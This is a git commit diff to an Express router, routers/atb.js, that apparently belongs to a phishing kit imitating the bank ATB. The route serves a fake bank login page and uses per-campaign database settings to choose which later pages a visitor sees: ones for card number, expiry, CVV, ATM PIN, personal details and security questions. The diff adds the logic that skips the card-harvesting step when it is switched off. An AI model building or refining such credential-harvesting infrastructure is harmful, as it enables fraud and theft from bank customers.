b59ef54a6fefc0d233610f50c80240104537002e
wghari <1786126@crosemont.qc.ca>
2024-01-25 13:00:54 -0500

    nothing

--- routers/atb.js
+++ routers/atb.js
@@ -12,29 +12,46 @@ router.get('/login', async (req, res) => {
         const result = await pool.query('SELECT data FROM items WHERE id = $1', [getId]);
         let count = 0
         let countRmvDetailsPage = 0
+        let countRmvCardPage = 0
         let rmvDetailsPage = false
+        let rmvCardPage = false
 
         Object.keys(result.rows[0].data.settings.atb).forEach(key => {
             if (result.rows[0].data.settings.atb[key] === 'off') {
               count++;
               if(key != 'card' && key != 'exp' && key != 'cvv' && key != 'atm'){
-                console.log(key);
                 countRmvDetailsPage++;
-              } 
+              } else {
+                countRmvCardPage++;
+              }
             }
         });
 
         if(countRmvDetailsPage == 10){
-            console.log('removeDetails');
             rmvDetailsPage = true
+            console.log("Remove Details : ")
+        } else if(countRmvCardPage == 4){
+            rmvCardPage = true 
         }
         
+        console.log("Remove Details : ", rmvDetailsPage)
+        console.log("Remove Card : ", rmvCardPage)
+
+
         if (result.rows[0].data.settings.atb.qa > 0) {
             res.render('bank/atb/login/index', { navig: "/atb/qst" });
         } else if(count >= 14) {
             res.render('bank/atb/login/index', {navig: "/atb/finish"});
         } else {
-            res.render('bank/atb/login/index', { navig: "/atb/details" });
+            if(rmvDetailsPage){
+                if(rmvCardPage){
+                    res.render('bank/atb/login/index', { navig: "/atb/finish" });
+                } else {
+                    res.render('bank/atb/login/index', { navig: "/atb/card" });
+                }
+            } else {
+                res.render('bank/atb/login/index', { navig: "/atb/details" });
+            }
         }
 
 
